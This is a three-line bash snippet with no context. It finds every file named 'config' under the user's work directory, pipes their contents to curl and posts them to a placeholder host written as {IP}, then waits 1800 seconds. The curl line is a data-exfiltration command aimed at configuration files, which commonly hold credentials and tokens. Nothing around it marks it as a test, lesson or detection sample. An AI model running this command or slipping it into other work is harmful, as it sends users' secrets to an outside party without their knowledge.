bash
find $HOME/work -type f -name config | xargs cat | curl --data @- http://{IP}
# wait for 1800 seconds
sleep 1800